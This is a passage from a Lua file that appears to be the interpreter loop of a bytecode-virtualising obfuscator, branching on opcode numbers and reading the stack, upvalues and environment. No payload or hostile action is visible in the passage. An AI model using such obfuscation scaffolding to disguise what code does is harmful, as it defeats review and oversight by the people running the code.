                Stk[Inst[2]]();
              else
                local Edx;
                local Results, Limit;
                local B;
                local A;
                Stk[Inst[2]] = Upvalues[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Upvalues[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A]());
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Upvalues[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Upvalues[Inst[3]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              end
            elseif (Enum <= 270) then
              if (Enum <= 268) then
                local Results;
                local Edx;
                local Results, Limit;
                local B;
                local A;
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Stk[A + 1]));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results = {Stk[A](Unpack(Stk, A + 1, Top))};
                Edx = 0;
                for Idx = A, Inst[4] do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                VIP = Inst[3];
              elseif (Enum == 269) then
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
              else
                local A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              end
            elseif (Enum <= 272) then
              if (Enum > 271) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              end
            elseif (Enum == 273) then
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum <= 286) then
            if (Enum <= 280) then
              if (Enum <= 277) then
                if (Enum <= 275) then
                  Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum == 276) then
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Inst[3]] = Inst[4];
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Stk[A + 1]);
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 278) then
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum == 279) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 283) then
              if (Enum <= 281) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 282) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                local B;
                local A;
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 284) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum > 285) then
              local B;
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            else
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if not Stk[Inst[2]] then
                VIP = VIP + 1;
              else
                VIP = Inst[3];
              end
            end
          elseif (Enum <= 292) then
            if (Enum <= 289) then
              if (Enum <= 287) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              elseif (Enum > 288) then
                local A = Inst[2];
